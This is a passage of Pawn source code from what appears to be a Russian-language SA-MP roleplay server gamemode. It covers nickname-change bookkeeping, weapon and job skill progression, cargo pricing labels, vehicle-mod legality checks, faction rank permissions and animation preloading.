		if(strcmp(PlayerInfo[playerid][pName],CasinoInfo[i][caKrupie8],true) == 0) strmid(CasinoInfo[i][caKrupie8], WantNickChange[playerid], 0, strlen(WantNickChange[playerid]), 50);
		if(strcmp(PlayerInfo[playerid][pName],CasinoInfo[i][caKrupie9],true) == 0) strmid(CasinoInfo[i][caKrupie9], WantNickChange[playerid], 0, strlen(WantNickChange[playerid]), 50);
		if(strcmp(PlayerInfo[playerid][pName],CasinoInfo[i][caKrupie10],true) == 0) strmid(CasinoInfo[i][caKrupie10], WantNickChange[playerid], 0, strlen(WantNickChange[playerid]), 50);
	}
	for(new i = 1; i <= TOTALSHOPS; i++)
	{
		if(strcmp(PlayerInfo[playerid][pName],WorkshopInfo[i][wDeputy1],true) == 0) strmid(WorkshopInfo[i][wDeputy1], WantNickChange[playerid], 0, strlen(WantNickChange[playerid]), 50);
		if(strcmp(PlayerInfo[playerid][pName],WorkshopInfo[i][wDeputy2],true) == 0) strmid(WorkshopInfo[i][wDeputy2], WantNickChange[playerid], 0, strlen(WantNickChange[playerid]), 50);
		if(strcmp(PlayerInfo[playerid][pName],WorkshopInfo[i][wDeputy3],true) == 0) strmid(WorkshopInfo[i][wDeputy3], WantNickChange[playerid], 0, strlen(WantNickChange[playerid]), 50);
		if(strcmp(PlayerInfo[playerid][pName],WorkshopInfo[i][wMechanic1],true) == 0) strmid(WorkshopInfo[i][wMechanic1], WantNickChange[playerid], 0, strlen(WantNickChange[playerid]), 50);
		if(strcmp(PlayerInfo[playerid][pName],WorkshopInfo[i][wMechanic2],true) == 0) strmid(WorkshopInfo[i][wMechanic2], WantNickChange[playerid], 0, strlen(WantNickChange[playerid]), 50);
		if(strcmp(PlayerInfo[playerid][pName],WorkshopInfo[i][wMechanic3],true) == 0) strmid(WorkshopInfo[i][wMechanic3], WantNickChange[playerid], 0, strlen(WantNickChange[playerid]), 50);
		if(strcmp(PlayerInfo[playerid][pName],WorkshopInfo[i][wMechanic4],true) == 0) strmid(WorkshopInfo[i][wMechanic4], WantNickChange[playerid], 0, strlen(WantNickChange[playerid]), 50);
		if(strcmp(PlayerInfo[playerid][pName],WorkshopInfo[i][wMechanic5],true) == 0) strmid(WorkshopInfo[i][wMechanic5], WantNickChange[playerid], 0, strlen(WantNickChange[playerid]), 50);
	}
	for(new i = 1; i <= TOTALFARM; i++)
	{
		if(strcmp(PlayerInfo[playerid][pName],FarmInfo[i][fDeputy_1],true) == 0) strmid(FarmInfo[i][fDeputy_1], WantNickChange[playerid], 0, strlen(WantNickChange[playerid]), 50);
		if(strcmp(PlayerInfo[playerid][pName],FarmInfo[i][fDeputy_2],true) == 0) strmid(FarmInfo[i][fDeputy_2], WantNickChange[playerid], 0, strlen(WantNickChange[playerid]), 50);
		if(strcmp(PlayerInfo[playerid][pName],FarmInfo[i][fDeputy_3],true) == 0) strmid(FarmInfo[i][fDeputy_3], WantNickChange[playerid], 0, strlen(WantNickChange[playerid]), 50);
		if(strcmp(PlayerInfo[playerid][pName],FarmInfo[i][fFarmer_1],true) == 0) strmid(FarmInfo[i][fFarmer_1], WantNickChange[playerid], 0, strlen(WantNickChange[playerid]), 50);
		if(strcmp(PlayerInfo[playerid][pName],FarmInfo[i][fFarmer_2],true) == 0) strmid(FarmInfo[i][fFarmer_2], WantNickChange[playerid], 0, strlen(WantNickChange[playerid]), 50);
		if(strcmp(PlayerInfo[playerid][pName],FarmInfo[i][fFarmer_3],true) == 0) strmid(FarmInfo[i][fFarmer_3], WantNickChange[playerid], 0, strlen(WantNickChange[playerid]), 50);
		if(strcmp(PlayerInfo[playerid][pName],FarmInfo[i][fFarmer_4],true) == 0) strmid(FarmInfo[i][fFarmer_4], WantNickChange[playerid], 0, strlen(WantNickChange[playerid]), 50);
		if(strcmp(PlayerInfo[playerid][pName],FarmInfo[i][fFarmer_5],true) == 0) strmid(FarmInfo[i][fFarmer_5], WantNickChange[playerid], 0, strlen(WantNickChange[playerid]), 50);
	}
	if(HGet(playerid)) strmid(HouseInfo[PlayerInfo[playerid][pPHouseKey]][hOwner], WantNickChange[playerid], 0, strlen(WantNickChange[playerid]), MAX_PLAYER_NAME);
	if(BGet(playerid)) strmid(BizzInfo[PlayerInfo[playerid][pPBizzKey]][bOwner], WantNickChange[playerid], 0, strlen(WantNickChange[playerid]), MAX_PLAYER_NAME);
	if(WGet(playerid)) strmid(WorkshopInfo[GetPVarInt(playerid,"wShop")][wOwner], WantNickChange[playerid], 0, strlen(WantNickChange[playerid]), MAX_PLAYER_NAME);
	if(KGet(playerid)) strmid(kvartinfo[PlayerInfo[playerid][pKvartiraKey]][vladelec], WantNickChange[playerid], 0, strlen(WantNickChange[playerid]), MAX_PLAYER_NAME);
	if(FGet(playerid)) strmid(FarmInfo[PlayerInfo[playerid][pPFarmKey]][fOwner], WantNickChange[playerid], 0, strlen(WantNickChange[playerid]), MAX_PLAYER_NAME);
	for(new i = 1; i <= TotalBizz; i++) if(!strcmp(Name(playerid), BizzInfo[i][bNameStavka], true)) { strmid(BizzInfo[i][bNameStavka], WantNickChange[playerid], 0, strlen(WantNickChange[playerid]), 50); }
	for(new i = 1; i <= TOTALSHOPS; i++) if(!strcmp(Name(playerid), WorkshopInfo[i][wAuctionName], true)) { strmid(WorkshopInfo[i][wAuctionName], WantNickChange[playerid], 0, strlen(WantNickChange[playerid]), 50); }
	for(new i = 1; i <= TOTALFARM; i++) if(!strcmp(Name(playerid), FarmInfo[i][fAuctionName], true)) { strmid(FarmInfo[i][fAuctionName], WantNickChange[playerid], 0, strlen(WantNickChange[playerid]), 50); }
	SetPlayerName(playerid, str);
	PlayerInfo[playerid][pCheckip] = 0;
	Kick(playerid);
	return true;
}
Convert(number)
{
	new hours = 0, mins = 0, secs = 0, str[100];
	hours = floatround(number / 3600);
	mins = floatround((number / 60) - (hours * 60));
	secs = floatround(number - ((hours * 3600) + (mins * 60)));
	if(hours > 0) format(str, 100, "%i:%02d:%02d", hours, mins, secs);
	else format(str, 100, "%i:%02d", mins, secs);
	return str;
}
stock SetPlayerHealthAC(playerid, Float: Health)
{
	if(IsPlayerConnected(playerid)) PlayerInfo[playerid][pHP] = Health, SetPlayerHealth(playerid, Health), HealthOn[playerid] = 1;
	return true;
}
stock SetPlayerArmourAC(playerid, Float: Arm)
{
	if(IsPlayerConnected(playerid)) PlayerInfo[playerid][pArmour] = Arm, Armour[playerid] = Arm, SetPlayerArmour(playerid, Arm);
	return true;
}
stock AnRepairVehicle(vehicleid)
{
	CarHealth[vehicleid] = float(1000);
	TimeHealth[vehicleid] = 2;
	RepairVehicle(vehicleid);
	return true;
}
publics: LicClose() return MoveObject(licgate, -2074.50000000,-94.90000153,35.00000000-0.020,0.020, 0.00,90.00,90.00);
publics: GruzClose() return MoveObject(gruzgate, 2203.8630371094,-2252.1179199219,13.5-0.120,0.120, 0.00,270.00,316.00);
stock GetPlayerID(str[])
{
	foreach(i)
	{
		new testname[MAX_PLAYER_NAME];
		GetPlayerName(i, testname, sizeof(testname));
		if(strcmp(testname, str, true, strlen(str)) == 0) return i;
	}
	return INVALID_PLAYER_ID;
}
stock UpdateCost()
{
	new rand = 100 + random(1000);
	Sellbenz[0] += rand;
	Sellbenz[1] += rand;
	Sellugol[0] += rand;
	Sellugol[1] += rand;
	Sellderevo[0] += rand;
	Sellderevo[1] += rand;
	Benzbuy[0] += rand;
	Benzbuy[1] += rand;
	ugolbuy[0] += rand;
	ugolbuy[1] += rand;
	Buyderevo[0] += rand;
	Buyderevo[1] += rand;
	new str[60];
	format(str, sizeof(str), "Порт ЛС\nНефть: %i\nУголь: %i\nДерево: %i",Sellbenz[0],Sellugol[0],Sellderevo[0]);
	UpdateDynamic3DTextLabelText(Doki[0],0xFFFF00FF,str);
	format(str, sizeof(str), "Порт СФ\nНефть: %i\nУголь: %i\nДерево: %i",Sellbenz[1],Sellugol[1],Sellderevo[1]);
	UpdateDynamic3DTextLabelText(Doki[1],0xFFFF00FF,str);
	format(str, sizeof(str), "Нефтезавод №1\nЦена за тонну: %i",Benzbuy[0]);
	UpdateDynamic3DTextLabelText(GasZavod[0],0xFFFF00FF,str);
	format(str, sizeof(str), "Нефтезавод №2\nЦена за тонну: %i",Benzbuy[1]);
	UpdateDynamic3DTextLabelText(GasZavod[1],0xFFFF00FF,str);
	format(str, sizeof(str), "Cклад угля №1\nЦена за тонну: %i",ugolbuy[0]);
	UpdateDynamic3DTextLabelText(Sklad[0],0xFFFF00FF,str);
	format(str, sizeof(str), "Cклад угля №2\nЦена за тонну: %i",ugolbuy[1]);
	UpdateDynamic3DTextLabelText(Sklad[1],0xFFFF00FF,str);
	format(str, sizeof(str), "Лесопилка №1\nЦена за тонну: %i",Buyderevo[0]);
	UpdateDynamic3DTextLabelText(Derevobuy[0],0xFFFF00FF,str);
	format(str, sizeof(str), "Лесопилка №2\n Цена за тонну: %i",Buyderevo[1]);
	UpdateDynamic3DTextLabelText(Derevobuy[1],0xFFFF00FF,str);
	return true;
}
stock Expirence(playerid)
{
	new exp = PlayerInfo[playerid][pDExp];
	new nxtlevel = PlayerInfo[playerid][pDLevel];
	new expamount = nxtlevel*levelDexp;
	if(exp >= expamount && PlayerInfo[playerid][pDLevel] != 26)
	{
		PlayerInfo[playerid][pDLevel] += 1;
		PlayerInfo[playerid][pDMgruz]++;
		if(PlayerInfo[playerid][pDLevel] == 5) PlayerInfo[playerid][pDMgruz] = 21;
		if(PlayerInfo[playerid][pDLevel] == 15) PlayerInfo[playerid][pDMgruz] = 35;
		if(PlayerInfo[playerid][pDLevel] == 25) PlayerInfo[playerid][pDMgruz] = 50;
		PlayerInfo[playerid][pDExp] = 0;
		format(YCMDstr, sizeof(YCMDstr), " {00D26D}Поздравляем! Ваш навык дальнобойщика улучшился.");
		SCM(playerid, 0x66FBA6FF, YCMDstr);
	}
	return true;
}
stock ExpExp(playerid)
{
	switch(PlayerInfo[playerid][pPProc])
	{
	case 10,20,30,40,50,60,70,80,90,100:
		{
			if(PlayerInfo[playerid][pPSkill] == 12) return true;
			PlayerInfo[playerid][pPSkill] += 1;
			PlayerInfo[playerid][pPMGruz] += 200;
			format(YCMDstr, sizeof(YCMDstr), " {00D26D}Поздравляем! Ваш навык развозчика улучшился.");
			SCM(playerid, 0x66FBA6FF, YCMDstr);
		}
	}
	return true;
}
stock ToDevelopSkills(Slashes,Points)
{
	new SlashesAndPoints[200];
	new Slash[2] = "|";
	new Point[2] = "'";
	for(new i = 0; i < Slashes; i++) strcat(SlashesAndPoints, Slash);
	for(new i = 0; i < Points; i++) strcat(SlashesAndPoints, Point);
	return SlashesAndPoints;
}
stock SetPlayerSkills(playerid)
{
	SetPlayerSkillLevel(playerid, WEAPONSKILL_PISTOL_SILENCED, PlayerInfo[playerid][pGunSkill][0]*10);
	SetPlayerSkillLevel(playerid, WEAPONSKILL_DESERT_EAGLE, PlayerInfo[playerid][pGunSkill][1]*10);
	SetPlayerSkillLevel(playerid, WEAPONSKILL_SHOTGUN, PlayerInfo[playerid][pGunSkill][2]*10);
	SetPlayerSkillLevel(playerid, WEAPONSKILL_MP5, PlayerInfo[playerid][pGunSkill][3]*10);
	SetPlayerSkillLevel(playerid, WEAPONSKILL_AK47, PlayerInfo[playerid][pGunSkill][4]*10);
	SetPlayerSkillLevel(playerid, WEAPONSKILL_M4, PlayerInfo[playerid][pGunSkill][5]*10);
	return true;
}
stock OnPlayerAmmoChange(playerid, newammo, oldammo)
{
	if(newammo < oldammo)
	{
		if(newammo >= 0 && newammo <= 1) SetPVarInt(playerid, "GunCheckTime", 3);
		switch(GetPlayerWeapon(playerid))
		{
		case 24:
			{
				switch(booston)
				{
				    case 0:
					{
						SetPVarInt(playerid, "SkillD",GetPVarInt(playerid, "SkillD") +1);
						if(GetPVarInt(playerid, "SkillD") >= Ammo_DEAGLE)
						{
							PlayerInfo[playerid][pGunSkill][1]++;
							SetPVarInt(playerid, "SkillD",0);
							if(PlayerInfo[playerid][pGunSkill][1] > 100) return PlayerInfo[playerid][pGunSkill][1] = 100,SetPlayerSkills(playerid);
						}
					}
				    case 1:
					{
						SetPVarInt(playerid, "SkillD",GetPVarInt(playerid, "SkillD") +3);
						if(GetPVarInt(playerid, "SkillD") >= Ammo_DEAGLE)
						{
							PlayerInfo[playerid][pGunSkill][1]+=3;
							SetPVarInt(playerid, "SkillD",0);
							if(PlayerInfo[playerid][pGunSkill][1] > 100) return PlayerInfo[playerid][pGunSkill][1] = 100,SetPlayerSkills(playerid);
						}
					}
				}
			}
		case 23:
			{
				switch(booston)
				{
				    case 0:
					{
						SetPVarInt(playerid, "SkillSD",GetPVarInt(playerid, "SkillSD") +1);
						if(GetPVarInt(playerid, "SkillSD")>= Ammo_SDPISTOL)
						{
							PlayerInfo[playerid][pGunSkill][0]++;
							SetPVarInt(playerid, "SkillSD",0);
							if(PlayerInfo[playerid][pGunSkill][0] > 100) return PlayerInfo[playerid][pGunSkill][0] = 100,SetPlayerSkills(playerid);
						}
					}
                    case 1:
					{
						SetPVarInt(playerid, "SkillSD",GetPVarInt(playerid, "SkillSD") +3);
						if(GetPVarInt(playerid, "SkillSD")>= Ammo_SDPISTOL)
						{
							PlayerInfo[playerid][pGunSkill][0]+=3;
							SetPVarInt(playerid, "SkillSD",0);
							if(PlayerInfo[playerid][pGunSkill][0] > 100) return PlayerInfo[playerid][pGunSkill][0] = 100,SetPlayerSkills(playerid);
						}
					}
				}
			}
		case 25:
			{
				switch(booston)
				{
				    case 0:
					{
						SetPVarInt(playerid, "SkillShot",GetPVarInt(playerid, "SkillShot") +1);
						if(GetPVarInt(playerid, "SkillShot") >= Ammo_SHOTGUN)
						{
							PlayerInfo[playerid][pGunSkill][2]++;
							SetPVarInt(playerid, "SkillShot",0);
							if(PlayerInfo[playerid][pGunSkill][2] > 100) return PlayerInfo[playerid][pGunSkill][2] = 100,SetPlayerSkills(playerid);
						}
					}
                    case 1:
					{
						SetPVarInt(playerid, "SkillShot",GetPVarInt(playerid, "SkillShot") +3);
						if(GetPVarInt(playerid, "SkillShot") >= Ammo_SHOTGUN)
						{
							PlayerInfo[playerid][pGunSkill][2]+=3;
							SetPVarInt(playerid, "SkillShot",0);
							if(PlayerInfo[playerid][pGunSkill][2] > 100) return PlayerInfo[playerid][pGunSkill][2] = 100,SetPlayerSkills(playerid);
						}
					}
				}
			}
		case 29:
			{
				switch(booston)
				{
				    case 0:
					{
						SetPVarInt(playerid, "SkillMP5",GetPVarInt(playerid, "SkillMP5") +1);
						if(GetPVarInt(playerid, "SkillMP5") >= Ammo_MP5)
						{
							PlayerInfo[playerid][pGunSkill][3]++;
							SetPVarInt(playerid, "SkillMP5",0);
							if(PlayerInfo[playerid][pGunSkill][3] > 100) return PlayerInfo[playerid][pGunSkill][3] = 100,SetPlayerSkills(playerid);
						}
					}
				    case 1:
					{
						SetPVarInt(playerid, "SkillMP5",GetPVarInt(playerid, "SkillMP5") +3);
						if(GetPVarInt(playerid, "SkillMP5") >= Ammo_MP5)
						{
							PlayerInfo[playerid][pGunSkill][3]+=3;
							SetPVarInt(playerid, "SkillMP5",0);
							if(PlayerInfo[playerid][pGunSkill][3] > 100) return PlayerInfo[playerid][pGunSkill][3] = 100,SetPlayerSkills(playerid);
						}
					}
				}
			}
		case 30:
			{
				switch(booston)
				{
				    case 0:
					{
						SetPVarInt(playerid, "SkillAk47",GetPVarInt(playerid, "SkillAk47") +1);
						if(GetPVarInt(playerid, "SkillAk47") >= Ammo_AK47)
						{
							PlayerInfo[playerid][pGunSkill][4]++;
							SetPVarInt(playerid, "SkillAk47",0);
							if(PlayerInfo[playerid][pGunSkill][4] > 100) return PlayerInfo[playerid][pGunSkill][4] = 100,SetPlayerSkills(playerid);
						}
					}
				    case 1:
					{
						SetPVarInt(playerid, "SkillAk47",GetPVarInt(playerid, "SkillAk47") +3);
						if(GetPVarInt(playerid, "SkillAk47") >= Ammo_AK47)
						{
							PlayerInfo[playerid][pGunSkill][4]+=3;
							SetPVarInt(playerid, "SkillAk47",0);
							if(PlayerInfo[playerid][pGunSkill][4] > 100) return PlayerInfo[playerid][pGunSkill][4] = 100,SetPlayerSkills(playerid);
						}
					}
				}
			}
		case 31:
			{
				switch(booston)
				{
				    case 0:
					{
						SetPVarInt(playerid, "SkillM4",GetPVarInt(playerid, "SkillM4") +1);
						if(GetPVarInt(playerid, "SkillM4") >= Ammo_M4A1)
						{
							PlayerInfo[playerid][pGunSkill][5]++;
							SetPVarInt(playerid, "SkillM4",0);
							if(PlayerInfo[playerid][pGunSkill][5] > 100) return PlayerInfo[playerid][pGunSkill][5] = 100,SetPlayerSkills(playerid);
						}
					}
				    case 1:
					{
						SetPVarInt(playerid, "SkillM4",GetPVarInt(playerid, "SkillM4") +3);
						if(GetPVarInt(playerid, "SkillM4") >= Ammo_M4A1)
						{
							PlayerInfo[playerid][pGunSkill][5]+=3;
							SetPVarInt(playerid, "SkillM4",0);
							if(PlayerInfo[playerid][pGunSkill][5] > 100) return PlayerInfo[playerid][pGunSkill][5] = 100,SetPlayerSkills(playerid);
						}
					}
				}
			}
		}
	    mysql_format(DATABASE,QUERY,300, "UPDATE `"TABLE_ACCOUNTS"` SET pGunSkills = '%i,%i,%i,%i,%i,%i' WHERE name = '%e'", PlayerInfo[playerid][pGunSkill][0],PlayerInfo[playerid][pGunSkill][1],PlayerInfo[playerid][pGunSkill][2],PlayerInfo[playerid][pGunSkill][3],PlayerInfo[playerid][pGunSkill][4],PlayerInfo[playerid][pGunSkill][5], PlayerInfo[playerid][pName]);
        mysql_function_query(DATABASE,QUERY,false,"","");
	}
	return true;
}
stock ClearTotalGz()
{
	TotalGzR = 0;
	TotalGzA = 0;
	TotalGzB = 0;
	TotalGzG = 0;
	TotalGzV = 0;
}
stock IsWheelModel(modelid)
{
	new wheelmodels[17] = {1025,1073,1074,1075,1076,1077,1078,1079,1080,1081,1082,1083,1084,1085,1096,1097,1098};
	for(new i=0;i<17;i++)
	{
		if (modelid == wheelmodels[i])
		return true;
	}
	return false;
}
stock IsLegalCarNitroIde(carmodel)
{
	new illegalvehs[29] = { 581, 523, 462, 521, 463, 522, 461, 448, 468, 586, 509, 481, 510, 472, 473, 493, 595, 484, 430, 453, 452, 446, 454, 590, 569, 537, 538, 570, 449 };
	for(new i=0;i<29;i++)
	{
		if (carmodel == illegalvehs[i])
		return true;
	}
	return false;
}
stock IsLegal_Nos_Vehicle(PlayerID)
{
	new carid = GetPlayerVehicleID(PlayerID);
	new playercarmodel = GetVehicleModel(carid);
	return IsLegalCarNitroIde(playercarmodel);
}
stock IsLegalCarMod(vehicleide, componentid)
{
	new modok = false;
	if((IsWheelModel(componentid)) || (componentid == 1086) || (componentid == 1087) || ((componentid >= 1008) && (componentid <= 1010)))
	{
		new nosblocker = IsLegalCarNitroIde(vehicleide);
		if (!nosblocker)
		modok = true;
	}
	else
	{
		for(new I=0;I<48;I++)
		{
			if (legalmods[I][0] == vehicleide)
			{
				for(new J = 1; J < 22; J++)
				{
					if (legalmods[I][J] == componentid)
					modok = true;
				}
			}
		}
	}
	return modok;
}
public OnVehiclePaintjob(playerid, vehicleid, paintjobid)
{
	return true;
}
public OnVehicleMod(playerid, vehicleid, componentid)
{
	new vehicleide = GetVehicleModel(vehicleid);
	new modok = IsLegalCarMod(vehicleide, componentid);
	if(!modok) Kick(playerid);
	return true;
}
/*stock NewsBank(playerid)
{
	new full;
	switch(PlayerInfo[playerid][pMember])
	{
	    case 16: full = 0; break; // LS
	    case 9: full = 1; break;// SF
	    case 20: full = 2; break; // LV
	}
	
	return true;
}*/
stock AdvertList(playerid)
{
	new full, str[90], strrr[600];
	switch(PlayerInfo[playerid][pMember])
	{
	case 16: full = 0; // LS
	case 9: full = 1; // SF
	case 20: full = 2; // LV
	}
	for(new i = 1; i <= TOTALADVERT[full];i++)
	{
		if(AdvertInfo[i][full][edited] == false) format(str, sizeof(str), "%i Имя: %s \n",i, AdvertInfo[i][full][adName]);
		else format(str, sizeof(str), "%i Имя: %s {00FF00} Проверил: %s\n",i, AdvertInfo[i][full][adName], AdvertInfo[i][full][editName]);
		strcat(strrr, str);
	}
	if(TOTALADVERT[full] == 0) return ShowPlayerDialogEx(playerid, 69, 0, "Объявления", "    Новых объявлений нет", "Назад", "");
	ShowPlayerDialogEx(playerid, 11518, 2, "Объявления", strrr, "Принять", "Отмена");
	return true;
}
publics: AntiBunny(playerid)
{
	ApplyAnimation(playerid, "PED", "getup_front",4.0,0,0,0,0,0);
	SetTimerEx("AntiBunnyHop",1500,false, "i",playerid);
	return true;
}
stock GetSquareDistance(Float:x1,Float:y1,Float:z1,Float:x2,Float:y2,Float:z2)
{
	x1-= x2;
	y1-= y2;
	z1-= z2;
	x1*= x1;
	y1*= y1;
	z1*= z1;
	return floatround(x1+y1+z1);
}
stock GetPlayerCameraLookAt(playerid, &Float:rX, &Float:rY, &Float:rZ, Float:dist = 10.0)
{
	new Float: locAt[6];
	GetPlayerCameraFrontVector(playerid, locAt[0], locAt[1], locAt[2]);
	GetPlayerCameraPos(playerid, locAt[3], locAt[4], locAt[5]);
	rX = locAt[0] * dist + locAt[3];
	rY = locAt[1] * dist + locAt[4];
	rZ = locAt[2] * dist + locAt[5];
}
AntiDeAMX()
{
	new a[][] =
	{
		"Unarmed (Fist)",
		"Brass K"
	};
	#pragma unused a
}
stock CanUninviteforeach(playerid,playerid2)
{
	if(PlayerInfo[playerid][pLeader] >= 1) return true;
	new rank = PlayerInfo[playerid][pRank];
	if(PlayerInfo[playerid][pMember] > 0 && PlayerInfo[playerid2][pMember] > 0 &&
			rank < PlayerInfo[playerid2][pRank] || !GetPVarInt(playerid,"Fraction_Duty")) return false;
	switch(PlayerInfo[playerid][pMember])
	{
	case 1:
		{
			switch(rank)
			{
			case 15:return true;
			case 14:return true;
			case 13:return true;
			}
		}
	case 2:
		{
			switch(rank)
			{
			case 10:return true;
			case 9:return true;
			case 8:return true;
			}
		}
	case 3:
		{
			switch(rank)
			{
			case 16:return true;
			case 15:return true;
			case 14:return true;
			}
		}
	case 4:
		{
			switch(rank)
			{
			case 10:return true;
			case 9:return true;
			case 8:return true;
			}
		}
	case 5:
		{
			switch(rank)
			{
			case 10:return true;
			case 9:return true;
			case 8:return true;
			}
		}
	case 6:
		{
			switch(rank)
			{
			case 10:return true;
			case 9:return true;
			case 8:return true;
			}
		}
	case 7:
		{
			switch(rank)
			{
			case 6:return true;
			case 5:return true;
			case 4:return true;
			}
		}
	case 8:
		{
			switch(rank)
			{
			case 2:return true;
			}
		}
	case 9:
		{
			switch(rank)
			{
			case 10:return true;
			case 9:return true;
			case 8:return true;
			}
		}
	case 10:
		{
			switch(rank)
			{
			case 15:return true;
			case 14:return true;
			case 13:return true;
			}
		}
	case 11..18:
		{
			switch(rank)
			{
			case 10:return true;
			case 9:return true;
			case 8:return true;
			}
		}
	case 19:
		{
			switch(rank)
			{
			case 16:return true;
			case 15:return true;
			case 14:return true;
			}
		}
	case 20:
		{
			switch(rank)
			{
			case 10:return true;
			case 9:return true;
			case 8:return true;
			}
		}
	case 21:
		{
			switch(rank)
			{
			case 15:return true;
			case 14:return true;
			case 13:return true;
			}
		}
	case 22:
		{
			switch(rank)
			{
			case 10:return true;
			case 9:return true;
			case 8:return true;
			}
		}
	case 23..32:
		{
			switch(rank)
			{
			case 8:return true;
			case 7:return true;
			}
		}
	case 33:
		{
			switch(rank)
			{
			case 10:return true;
			case 9:return true;
			case 8:return true;
			}
		}
	case 34:
		{
			switch(rank)
			{
			case 5:return true;
			case 4:return true;
			}
		}
	}
	return false;
}
stock PreloadAnimLib(playerid, animlib[]) ApplyAnimation(playerid,animlib,"null",0.0,0,0,0,0,0);
stock PreloadAllAnimLibs (playerid)
{
	PreloadAnimLib(playerid,"AIRPORT");
	PreloadAnimLib(playerid,"Attractors");
	PreloadAnimLib(playerid,"BAR");
	PreloadAnimLib(playerid,"BASEBALL");
	PreloadAnimLib(playerid,"BD_FIRE");
	PreloadAnimLib(playerid,"BEACH");
	PreloadAnimLib(playerid,"benchpress");
	PreloadAnimLib(playerid,"BF_injection");
	PreloadAnimLib(playerid,"BIKED");
	PreloadAnimLib(playerid,"BIKEH");
	PreloadAnimLib(playerid,"BIKELEAP");
	PreloadAnimLib(playerid,"BIKES");
	PreloadAnimLib(playerid,"BIKEV");
	PreloadAnimLib(playerid,"BIKE_DBZ");
	PreloadAnimLib(playerid,"BLOWJOBZ");
	PreloadAnimLib(playerid,"BMX");
	PreloadAnimLib(playerid,"BOMBER");
	PreloadAnimLib(playerid,"BOX");
	PreloadAnimLib(playerid,"BSKTBALL");
	PreloadAnimLib(playerid,"BUDDY");
	PreloadAnimLib(playerid,"BUS");
	PreloadAnimLib(playerid,"CAMERA");
	PreloadAnimLib(playerid,"CAR");
	PreloadAnimLib(playerid,"CARRY");
	PreloadAnimLib(playerid,"CAR_CHAT");
	PreloadAnimLib(playerid,"CASINO");
	PreloadAnimLib(playerid,"CHAINSAW");
	PreloadAnimLib(playerid,"CHOPPA");
	PreloadAnimLib(playerid,"CLOTHES");
	PreloadAnimLib(playerid,"COACH");
	PreloadAnimLib(playerid,"COLT45");
	PreloadAnimLib(playerid,"COP_AMBIENT");
	PreloadAnimLib(playerid,"COP_DVBYZ");
	PreloadAnimLib(playerid,"CRACK");
	PreloadAnimLib(playerid,"CRIB");
	PreloadAnimLib(playerid,"DAM_JUMP");
	PreloadAnimLib(playerid,"DANCING");
	PreloadAnimLib(playerid,"DEALER");
	PreloadAnimLib(playerid,"DILDO");
	PreloadAnimLib(playerid,"DODGE");
	PreloadAnimLib(playerid,"DOZER");
	PreloadAnimLib(playerid,"DRIVEBYS");
	PreloadAnimLib(playerid,"FAT");
	PreloadAnimLib(playerid,"FIGHT_B");
	PreloadAnimLib(playerid,"FIGHT_C");
	PreloadAnimLib(playerid,"FIGHT_D");
	PreloadAnimLib(playerid,"FIGHT_E");
	PreloadAnimLib(playerid,"FINALE");
	PreloadAnimLib(playerid,"FINALE2");
	PreloadAnimLib(playerid,"FLAME");
	PreloadAnimLib(playerid,"Flowers");
	PreloadAnimLib(playerid,"FOOD");
	PreloadAnimLib(playerid,"Freeweights");
	PreloadAnimLib(playerid,"GANGS");
	PreloadAnimLib(playerid,"GHANDS");
	PreloadAnimLib(playerid,"GHETTO_DB");
	PreloadAnimLib(playerid,"goggles");
	PreloadAnimLib(playerid,"GRAFFITI");
	PreloadAnimLib(playerid,"GRAVEYARD");
	PreloadAnimLib(playerid,"GRENADE");
	PreloadAnimLib(playerid,"GYMNASIUM");
	PreloadAnimLib(playerid,"HAIRCUTS");
	PreloadAnimLib(playerid,"HEIST9");
	PreloadAnimLib(playerid,"INT_HOUSE");
	PreloadAnimLib(playerid,"INT_OFFICE");
	PreloadAnimLib(playerid,"INT_SHOP");
	PreloadAnimLib(playerid,"JST_BUISNESS");
	PreloadAnimLib(playerid,"KART");
	PreloadAnimLib(playerid,"KISSING");
	PreloadAnimLib(playerid,"KNIFE");
	PreloadAnimLib(playerid,"LAPDAN1");
	PreloadAnimLib(playerid,"LAPDAN2");
	PreloadAnimLib(playerid,"LAPDAN3");
	PreloadAnimLib(playerid,"LOWRIDER");
	PreloadAnimLib(playerid,"MD_CHASE");
	PreloadAnimLib(playerid,"MD_END");
	PreloadAnimLib(playerid,"MEDIC");
	PreloadAnimLib(playerid,"MISC");
	PreloadAnimLib(playerid,"MTB");
	PreloadAnimLib(playerid,"MUSCULAR");
	PreloadAnimLib(playerid,"NEVADA");
	PreloadAnimLib(playerid,"ON_LOOKERS");
	PreloadAnimLib(playerid,"OTB");
	PreloadAnimLib(playerid,"PARACHUTE");
	PreloadAnimLib(playerid,"PARK");
	PreloadAnimLib(playerid,"PAULNMAC");
	PreloadAnimLib(playerid,"ped");
	PreloadAnimLib(playerid,"PLAYER_DVBYS");
	PreloadAnimLib(playerid,"PLAYIDLES");
	PreloadAnimLib(playerid,"POLICE");
	PreloadAnimLib(playerid,"POOL");
	PreloadAnimLib(playerid,"POOR");
	PreloadAnimLib(playerid,"PYTHON");
	PreloadAnimLib(playerid,"QUAD");
	PreloadAnimLib(playerid,"QUAD_DBZ");
	PreloadAnimLib(playerid,"RAPPING");
	PreloadAnimLib(playerid,"RIFLE");
	PreloadAnimLib(playerid,"RIOT");
	PreloadAnimLib(playerid,"ROB_BANK");
	PreloadAnimLib(playerid,"ROCKET");
	PreloadAnimLib(playerid,"RUSTLER");
	PreloadAnimLib(playerid,"RYDER");
	PreloadAnimLib(playerid,"SCRATCHING");
	PreloadAnimLib(playerid,"SHAMAL");
	PreloadAnimLib(playerid,"SHOP");
	PreloadAnimLib(playerid,"SHOTGUN");
	PreloadAnimLib(playerid,"SILENCED");
	PreloadAnimLib(playerid,"SKATE");
	PreloadAnimLib(playerid,"SMOKING");
	PreloadAnimLib(playerid,"SNIPER");
	PreloadAnimLib(playerid,"SPRAYCAN");
	PreloadAnimLib(playerid,"STRIP");
	PreloadAnimLib(playerid,"SUNBATHE");
	PreloadAnimLib(playerid,"SWAT");
	PreloadAnimLib(playerid,"SWEET");
	PreloadAnimLib(playerid,"SWIM");
	PreloadAnimLib(playerid,"SWORD");
	PreloadAnimLib(playerid,"TANK");
	PreloadAnimLib(playerid,"TATTOOS");
	PreloadAnimLib(playerid,"TEC");
	PreloadAnimLib(playerid,"TRAIN");
	PreloadAnimLib(playerid,"TRUCK");
	PreloadAnimLib(playerid,"UZI");
	PreloadAnimLib(playerid,"VAN");
	PreloadAnimLib(playerid,"VENDING");
	PreloadAnimLib(playerid,"VORTEX");
	PreloadAnimLib(playerid,"WAYFARER");
	PreloadAnimLib(playerid,"WEAPONS");
	PreloadAnimLib(playerid,"WUZI");
	return 1;
}
stock updatekvar(i)
{
